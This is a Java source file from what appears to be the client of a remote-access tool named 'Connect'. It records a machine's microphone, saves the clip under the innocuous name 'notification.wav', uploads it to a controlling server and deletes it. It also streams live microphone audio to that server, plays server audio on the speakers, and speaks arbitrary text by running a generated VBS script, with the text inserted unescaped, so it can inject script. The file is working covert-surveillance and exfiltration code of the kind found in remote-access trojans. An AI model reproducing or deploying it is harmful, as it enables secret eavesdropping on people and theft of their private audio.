package br.com.introcdc.connect.client.components;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 17:04
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.client.ConnectClient;

import javax.sound.sampled.*;
import java.io.*;
import java.net.Socket;

public class ClientAudioComponents {

    // Audio Info
    public static final AudioFormat FORMAT = new AudioFormat(44100, 16, 2, true, true);

    public static void playText(String text) {
        try {
            String vbsScript = "Dim sapi\n"
                    + "Set sapi = CreateObject(\"SAPI.SpVoice\")\n"
                    + "sapi.Speak \"" + text + "\"";

            new Thread(() -> {
                File file = new File("tts.vbs");
                try {
                    FileOutputStream fos = new FileOutputStream(file);
                    OutputStreamWriter osw = new OutputStreamWriter(fos, "windows-1252");
                    osw.write(vbsScript);
                    osw.close();

                    Process process = Runtime.getRuntime().exec("wscript //nologo tts.vbs");
                    process.waitFor();
                } catch (Exception exception) {
                    ConnectClient.msg("Ocorreu um erro ao executar a voz: " + text + " (" + exception.getMessage() + ")");
                    ConnectClient.exception(exception);
                } finally {
                    file.delete();
                }
            }).start();
        } catch (Exception exception) {
            ConnectClient.msg("Ocorreu um erro ao executar a thread da voz: " + text + " (" + exception.getMessage() + ")");
            ConnectClient.exception(exception);
        }
    }

    public static void recordMicrophone(int seconds) {
        new Thread(() -> {
            try {
                TargetDataLine microphone = getTargetDataLine();
                if (microphone == null) {
                    ConnectClient.msg("Microfone não encontrado!");
                    return;
                }
                startRecording(microphone, seconds);
            } catch (Exception exception) {
                ConnectClient.msg("Ocorreu um erro ao gravar o áudio do microfone por " + seconds + " segundos! (" + exception.getMessage() + ")");
                ConnectClient.exception(exception);
            }
        }).start();
    }

    private static TargetDataLine getTargetDataLine() {
        try {
            DataLine.Info info = new DataLine.Info(TargetDataLine.class, FORMAT);
            if (!AudioSystem.isLineSupported(info)) {
                return null;
            }
            TargetDataLine line = (TargetDataLine) AudioSystem.getLine(info);
            if (line.isOpen()) {
                line.close();
            }
            line.open(FORMAT);
            line.start();
            return line;
        } catch (Exception exception) {
            ConnectClient.msg("Ocorreu um erro ao capturar a informação do microfone do cliente! (" + exception.getMessage() + ")");
            ConnectClient.exception(exception);
        }
        return null;
    }

    public static void startRecording(TargetDataLine line, int seconds) throws Exception {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        Thread thread = new Thread(() -> {
            try {
                recordAudio(line, out);
            } catch (Exception exception) {
                ConnectClient.msg("Ocorreu um erro no processo de gravação de áudio (" + exception.getMessage() + ")");
                ConnectClient.exception(exception);
            }
        });
        thread.start();

        ConnectClient.msg("Gravando áudio do microfone de " + seconds + " segundos!");
        Thread.sleep((seconds + 1) * 1000);

        thread.interrupt();
        line.close();

        save(out.toByteArray());
    }

    public static void recordAudio(TargetDataLine line, ByteArrayOutputStream out) throws Exception {
        byte[] buffer = new byte[4096];
        try {
            while (!Thread.interrupted()) {
                int bytesRead = line.read(buffer, 0, buffer.length);
                out.write(buffer, 0, bytesRead);
            }
        } catch (Exception exception) {
            ConnectClient.msg("Ocorreu um erro ao gravar o áudio no outstream! (" + exception.getMessage() + ")");
            ConnectClient.exception(exception);
        }
    }

    public static void save(byte[] audioData) {
        File file = new File("notification.wav");
        try (FileOutputStream fos = new FileOutputStream(file.getName())) {
            ByteArrayInputStream bais = new ByteArrayInputStream(audioData);
            AudioInputStream audioInputStream = new AudioInputStream(bais, FORMAT, audioData.length);
            AudioSystem.write(audioInputStream, new AudioFileFormat.Type("WAVE", "wave"), fos);
        } catch (Exception exception) {
            ClientFileComponents.deleteFile(file);
            ConnectClient.msg("Ocorreu um erro ao salvar o arquivo de gravação! (" + exception.getMessage() + ")");
            ConnectClient.exception(exception);
            return;
        }

        ConnectClient.msg("Enviando arquivo " + file.getName() + "...");
        ConnectClient.msg("receive-file");
        new Thread(() -> {
            try (Socket fileSocket = new Socket(Connect.IP, Connect.PORT);
                 DataOutputStream dos = new DataOutputStream(fileSocket.getOutputStream());
                 BufferedInputStream bis = new BufferedInputStream(new FileInputStream(file))) {
                dos.writeUTF("SECONDARY:" + ConnectClient.KEY + ":RECEIVE_FILE");

                dos.writeUTF(ClientFileComponents.removeCharacters(file.getName()));
                dos.flush();

                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = bis.read(buffer)) != -1) {
                    dos.write(buffer, 0, bytesRead);
                }
            } catch (Exception exception) {
                ConnectClient.msg("Ocorreu um erro ao enviar o arquivo! (" + exception.getMessage() + ")");
                ConnectClient.exception(exception);
            }

            ClientFileComponents.deleteFile(file);
        }).start();
    }

    public static void connectMicrophoneServer(boolean fromUser) {
        int port = Connect.PORT + (fromUser ? 7 : 8);
        ConnectClient.msg("Inicializando conexão de áudio " + (fromUser ? "do cliente para servidor" : "do servidor para o cliente") + "!");

        SourceDataLine speakers = null;
        TargetDataLine microphone = null;
        if (fromUser) {
            microphone = getTargetDataLine();
            if (microphone == null) {
                ConnectClient.msg("stopliveaudiouserMicrofone do cliente não encontrado!");
                return;
            }
            ClientImageComponents.AUDIO_USER_LIVE = true;
        } else {
            speakers = getSourceDataLine();
            if (speakers == null) {
                ConnectClient.msg("stopliveaudioserverAlto-falante do cliente não encontrado!");
                return;
            }
            ClientImageComponents.AUDIO_SERVER_LIVE = true;
        }
        ConnectClient.msg("Conectando ao servidor de áudio " + (fromUser ? "do cliente para servidor" : "do servidor para o cliente") + "!");

        try (Socket socket = new Socket(Connect.IP, Connect.PORT)) {
            new DataOutputStream(socket.getOutputStream()).writeUTF("SECONDARY:" + ConnectClient.KEY + ":" + (fromUser ? "AUDIO_USER" : "AUDIO_SERVER"));
            if (fromUser) {
                OutputStream out = socket.getOutputStream();

                byte[] buffer = new byte[4096];
                ConnectClient.msg("Enviando áudio do microfone para o servidor...");

                try {
                    while (ClientImageComponents.AUDIO_USER_LIVE) {
                        int bytesRead = microphone.read(buffer, 0, buffer.length);
                        if (bytesRead == -1) break;
                        out.write(buffer, 0, bytesRead);
                    }
                } catch (Exception exception) {
                    ConnectClient.msg("stopliveaudiouserOcorreu um erro na transmissão de áudio do cliente para o servidor! (" + exception.getMessage() + ")");
                    ConnectClient.exception(exception);
                } finally {
                    microphone.close();
                }
                ConnectClient.msg("stopliveaudiouserTransmissão de áudio do cliente para o servidor finalizada!");
            } else {
                InputStream in = socket.getInputStream();
                byte[] buffer = new byte[4096];
                int bytesRead;
                ConnectClient.msg("Recebendo áudio do servidor e reproduzindo...");

                try {
                    while (ClientImageComponents.AUDIO_SERVER_LIVE && (bytesRead = in.read(buffer)) != -1) {
                        speakers.write(buffer, 0, bytesRead);
                    }
                } catch (Exception exception) {
                    ConnectClient.msg("stopliveaudioserverOcorreu um erro na transmissão de áudio do servidor para o cliente! (" + exception.getMessage() + ")");
                    ConnectClient.exception(exception);
                } finally {
                    speakers.close();
                    ConnectClient.msg("stopliveaudioserverTransmissão de áudio do servidor para o cliente finalizada!");
                }
            }
        } catch (Exception exception) {
            if (ClientImageComponents.LIVE_STOPPER) {
                if (fromUser) {
                    if (ClientImageComponents.AUDIO_USER_LIVE) {
                        ClientImageComponents.AUDIO_USER_LIVE = false;
                    }
                    try {
                        microphone.close();
                    } catch (Exception ignored) {
                    }

                    ConnectClient.msg("stopliveaudiouserOcorreu um erro na transmissão de áudio do cliente para o servidor! (" + exception.getMessage() + ")");
                } else {
                    if (ClientImageComponents.AUDIO_SERVER_LIVE) {
                        ClientImageComponents.AUDIO_SERVER_LIVE = false;
                    }
                    try {
                        speakers.close();
                    } catch (Exception ignored) {
                    }

                    ConnectClient.msg("stopliveaudioserverOcorreu um erro na transmissão de áudio do servidor para o cliente! (" + exception.getMessage() + ")");
                }
            } else {
                if (fromUser) {
                    try {
                        microphone.close();
                    } catch (Exception ignored) {
                    }
                } else {
                    try {
                        speakers.close();
                    } catch (Exception ignored) {
                    }
                }

                ConnectClient.msg("Ocorreu um erro ao processar o áudio do " + (fromUser ? "cliente para o servidor" : "servidor para o cliente") + "! (" + exception.getMessage() + ")");
            }
            ConnectClient.exception(exception);
        }
    }

    private static SourceDataLine getSourceDataLine() {
        try {
            DataLine.Info info = new DataLine.Info(SourceDataLine.class, FORMAT);
            if (!AudioSystem.isLineSupported(info)) {
                return null;
            }
            SourceDataLine line = (SourceDataLine) AudioSystem.getLine(info);
            line.open(FORMAT);
            line.start();
            return line;
        } catch (Exception exception) {
            ConnectClient.msg("Ocorreu um erro ao capturar a informação do alto-falante do cliente! (" + exception.getMessage() + ")");
            ConnectClient.exception(exception);
            return null;
        }
    }

}
